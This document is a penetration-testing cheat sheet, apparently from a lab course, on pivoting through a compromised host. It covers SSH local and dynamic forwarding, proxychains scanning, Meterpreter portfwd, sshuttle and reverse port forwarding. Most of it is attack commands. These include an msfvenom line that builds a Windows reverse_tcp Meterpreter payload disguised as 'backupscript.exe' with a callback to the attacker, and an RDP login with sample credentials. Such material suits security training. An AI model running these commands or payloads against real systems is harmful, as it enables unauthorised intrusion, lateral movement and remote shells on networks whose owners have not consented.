**Overview:**
- Port forwarding redirects communication requests from one port to another, using TCP as the primary transport. SSH or SOCKS can be used to encapsulate forwarded traffic, effectively bypassing firewalls and leveraging existing services on a compromised host to pivot into other networks.
- Local port forwarding allows accessing services on a remote host as if they were running locally, enabling exploitation of services that would otherwise be unreachable from the attack machine.
- Port forwarding can also be accomplished using Meterpreter's `portfwd` module. We can enable a listener on our attack host and request Meterpreter to forward all the packets received on this port via our Meterpreter session to a remote host on the 172.16.5.0/23 network.
- Similar to local port forwards, Metasploit can also perform `reverse port forwarding` with the below command, where you might want to listen on a specific port on the compromised server and forward all incoming shells from the Ubuntu server to our attack host. We will start a listener on a new port on our attack host for Windows and request the Ubuntu server to forward all requests received to the Ubuntu server on port `1234` to our listener on port `8081`.
- [Sshuttle](https://github.com/sshuttle/sshuttle) is another tool written in Python which removes the need to configure proxychains. However, this tool only works for pivoting over SSH and does not provide other options for pivoting over TOR or HTTPS proxy servers. `Sshuttle` can be extremely useful for automating the execution of iptables and adding pivot rules for the remote host. shuttle creates an entry in our `iptables` to redirect all traffic to the 172.16.5.0/23 network through the pivot host.

---
## Local Port Forwarding

```
ssh -L 1234:localhost:3306 ubuntu@<target>
```

Forward local port `1234` to `localhost:3306` on the remote host. `-L` instructs the SSH client to forward all data sent to the local port to the specified destination on the remote server.

```
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@<target>
```

Forward multiple ports in a single SSH connection.

---
## Dynamic Port Forwarding (SOCKS Proxy)

```
ssh -D 9050 ubuntu@<target>
```

Enable dynamic port forwarding. `-D` creates a SOCKS proxy on local port `9050`, routing all traffic through the SSH tunnel.

```
proxychains nmap -v -Pn -sT 172.16.5.19
```

Scan a host through the pivot using proxychains. Ensure `/etc/proxychains.conf` has `socks4 127.0.0.1 9050` configured.

```
proxychains msfconsole
```

Launch Metasploit through the proxy to route all associated traffic through the tunnel.

## metasploit port forwarding
```
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
```

The above command requests the Meterpreter session to start a listener on our attack host's local port (`-l`) `3300` and forward all the packets to the remote (`-r`) Windows server `172.16.5.19` on `3389` port (`-p`) via our Meterpreter session.

```
xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```
connect to the windows session through localhost

## meterpreter reverse port forwarding
```
 portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```
create a reverse port forward on our existing shell from the previous scenario using the this
command. This command forwards all connections on port `1234` running on the Ubuntu server to our attack host on local port (`-l`) `8081`.
```
set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
```
background the session and set the correct payload

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
```
, if we execute our payload on the Windows host, we should be able to receive a shell from Windows pivoted via the Ubuntu server.

## sshuttle

```
 sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v 
```

running sshuttle specify the option `-r` to connect to the remote machine with a username and password. Then we need to include the network or IP we want to route through the pivot host, in our case, is the network 172.16.5.0/23. 